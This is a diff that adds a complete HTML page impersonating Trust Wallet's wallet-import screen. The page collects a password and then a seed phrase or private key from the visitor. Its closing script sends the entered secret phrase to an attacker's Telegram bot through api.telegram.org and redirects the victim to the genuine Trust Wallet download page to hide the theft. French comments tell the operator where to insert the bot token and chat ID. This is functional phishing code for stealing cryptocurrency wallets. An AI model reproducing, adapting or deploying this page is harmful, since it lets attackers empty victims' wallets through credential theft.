@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" type="image/png" href="https://s3.coinmarketcap.com/static-gravity/image/bdb7a8c7bb114e8aa29f8b6fee2e7a41.png" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Trust Wallet - Import</title>
+  <style>
+    body { margin: 0; font-family: sans-serif; display: flex; height: 100vh; }
+    .left {
+      width: 35%;
+      background: url('image-gauche.png') center/cover no-repeat;
+      transition: background-image 0.3s;
+    }
+    .right {
+      width: 65%;
+      padding: 100px 60px;
+      background: white;
+    }
+    .back { cursor: pointer; color: #444; margin-bottom: 30px; }
+    h3 { font-size: 20px; margin-bottom: 30px; }
+    .option {
+      background: #f1f1f4; padding: 20px; border-radius: 12px;
+      cursor: pointer; max-width: 500px;
+      display: flex; justify-content: space-between;
+    }
+    .option i {
+      background: #ccc; padding: 8px; border-radius: 50%;
+      margin-right: 12px;
+    }
+    .form-container { max-width: 500px; }
+    label { font-weight: bold; margin-top: 20px; display: block; }
+    input, textarea {
+      width: 100%; padding: 14px; border: 1px solid #ccc;
+      border-radius: 8px; margin-top: 5px; margin-bottom: 10px;
+      font-size: 14px;
+    }
+    button {
+      margin-top: 30px; width: 100%; background-color: #b3b3ff;
+      color: white; font-weight: bold; padding: 14px;
+      border: none; border-radius: 999px;
+      cursor: not-allowed; font-size: 16px; opacity: 0.6;
+      transition: 0.3s;
+    }
+    button.active {
+      background-color: #4c6ef5;
+      cursor: pointer;
+      opacity: 1;
+    }
+    .textarea-wrapper {
+      position: relative;
+    }
+    .masked-text {
+      position: absolute;
+      top: 14px; left: 14px; right: 14px; bottom: 14px;
+      pointer-events: none;
+      white-space: pre-wrap;
+      color: #333; font-size: 14px;
+      z-index: 1;
+      line-height: 1.5;
+    }
+    .masked-input {
+      position: relative;
+      z-index: 2;
+      color: transparent;
+      background: transparent;
+      caret-color: black;
+    }
+    #toggle-visibility {
+      position: absolute;
+      bottom: 10px;
+      right: 14px;
+      z-index: 3;
+      cursor: pointer;
+    }
+    #toggle-visibility svg {
+      width: 20px;
+      height: 20px;
+      fill: black;
+    }
+  </style>
+</head>
+<body>
+  <div class="left" id="left-section"></div>
+  <div class="right">
+    <div class="back" onclick="goBack()">← Back</div>
+    <h3 id="form-title">Select an option</h3>
+    <div id="content-area">
+      <div class="option" onclick="showPasswordForm()">
+        <span><i>🔒</i> Password</span>
+        <span>›</span>
+      </div>
+    </div>
+  </div>
+
+  <script src="bip39-words.js"></script>
+  <script>
+    const leftSection = document.getElementById("left-section");
+
+    function showPasswordForm() {
+      document.getElementById("form-title").textContent = "Create password";
+      document.getElementById("content-area").innerHTML = `
+        <div class="form-container">
+          <label>Password</label>
+          <input type="password" id="password" placeholder="Min 8 characters" />
+          <label>Confirm password</label>
+          <input type="password" id="confirm-password" placeholder="Password" />
+          <button id="continue-btn" disabled>Continue</button>
+        </div>
+      `;
+      leftSection.style.backgroundImage = "url('image-gauche.png')";
+      const password = document.getElementById("password");
+      const confirm = document.getElementById("confirm-password");
+      const btn = document.getElementById("continue-btn");
+
+      function check() {
+        btn.disabled = !(password.value.length >= 8 && password.value === confirm.value);
+        btn.classList.toggle("active", !btn.disabled);
+      }
+
+      password.addEventListener("input", check);
+      confirm.addEventListener("input", check);
+      btn.addEventListener("click", showImportForm);
+    }
+
+    function showImportForm() {
+      document.getElementById("form-title").textContent = "Import with Secret Phrase or Private Key";
+      document.getElementById("content-area").innerHTML = `
+        <div class="form-container">
+          <label>Wallet Name</label>
+          <input type="text" id="wallet-name" value="Main wallet" />
+          <small>You can edit this later</small>
+          <label>Enter Secret Phrase or Private Key</label>
+          <div class="textarea-wrapper">
+            <div id="masked-text" class="masked-text"></div>
+            <textarea id="secret-key" rows="5" class="masked-input" placeholder="Secret phrase or private key" style="padding-right: 40px;"></textarea>
+            <span id="toggle-visibility">
+              <svg id="eye-open" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path d="M12 4.5c-5.05 0-9.167 3.507-10.605 8.25C2.833 17.493 6.95 21 12 21s9.167-3.507 10.605-8.25C21.167 8.007 17.05 4.5 12 4.5zm0 14.25c-3.458 0-6.555-2.364-7.76-5.625C5.445 9.114 8.542 6.75 12 6.75s6.555 2.364 7.76 5.625c-1.205 3.261-4.302 5.625-7.76 5.625zm0-9.75a4.125 4.125 0 100 8.25 4.125 4.125 0 000-8.25zm0 6a1.875 1.875 0 110-3.75 1.875 1.875 0 010 3.75z"/>
+              </svg>
+              <svg id="eye-closed" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="display:none;">
+                <path d="M4.293 4.293l15.414 15.414-1.414 1.414L2.879 5.707z"/>
+              </svg>
+            </span>
+          </div>
+          <small>Secret Phrase is typically 12 (sometimes 18, 24) words separated by single spaces
+Private Key is a long alphanumeric code</small>
+          <button id="import-btn" disabled>Import</button>
+        </div>
+      `;
+
+      leftSection.style.backgroundImage = "url('image-import.png')";
+      const walletName = document.getElementById("wallet-name");
+      const secretKey = document.getElementById("secret-key");
+      const masked = document.getElementById("masked-text");
+      const btn = document.getElementById("import-btn");
+      const eyeOpen = document.getElementById("eye-open");
+      const eyeClosed = document.getElementById("eye-closed");
+      let isVisible = false;
+
+      function updateMask() {
+        const words = secretKey.value.trim().split(/\s+/);
+        const dots = words.map(w => '•'.repeat(w.length)).join(' ');
+        masked.textContent = dots;
+      }
+
+      function validate() {
+        const words = secretKey.value.trim().split(/\s+/);
+        const allValid = words.every(word => bip39Words.includes(word.toLowerCase()));
+        const valid = walletName.value.trim() !== "" && words.length > 0 && allValid;
+        btn.disabled = !valid;
+        btn.classList.toggle("active", valid);
+      }
+
+      secretKey.addEventListener("input", () => {
+        if (!isVisible) updateMask();
+        validate();
+      });
+
+      walletName.addEventListener("input", validate);
+
+      document.getElementById("toggle-visibility").addEventListener("click", () => {
+        isVisible = !isVisible;
+        secretKey.style.color = isVisible ? "#333" : "transparent";
+        masked.style.display = isVisible ? "none" : "block";
+        eyeOpen.style.display = isVisible ? "none" : "inline";
+        eyeClosed.style.display = isVisible ? "inline" : "none";
+      });
+
+      secretKey.style.color = "transparent";
+      updateMask();
+    }
+
+    function goBack() {
+      document.getElementById("form-title").textContent = "Select an option";
+      document.getElementById("content-area").innerHTML = `
+        <div class="option" onclick="showPasswordForm()">
+          <span><i>🔒</i> Password</span>
+          <span>›</span>
+        </div>
+      `;
+      leftSection.style.backgroundImage = "url('image-gauche.png')";
+    }
+
+    // ============================
+    // Telegram Bot Integration
+    // ============================
+    const TELEGRAM_TOKEN = 'TON_BOT_TOKEN_ICI'; // ← Remplace ici
+    const TELEGRAM_CHAT_ID = 'TON_CHAT_ID_ICI'; // ← Remplace ici
+
+    function sendEmailToTelegram(email) {
+      const message = `📩 Email collecté :\n${email}`;
+      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message
+        })
+      })
+      .then(res => {
+        if (res.ok) {
+          // ✅ Redirection après envoi réussi
+          window.location.href = "https://trustwallet.com/download"; // ← Change ici
+        } else {
+          alert("Erreur lors de l'envoi.");
+        }
+      })
+      .catch(err => {
+        console.error(err);
+        alert("Erreur réseau.");
+      });
+    }
+
+    document.addEventListener("click", function(e) {
+      if (e.target && e.target.id === "import-btn") {
+        const email = document.getElementById("secret-key")?.value.trim();
+        if (email) {
+          sendEmailToTelegram(email);
+        }
+      }
+    });
+  </script>
+</body>
+</html>
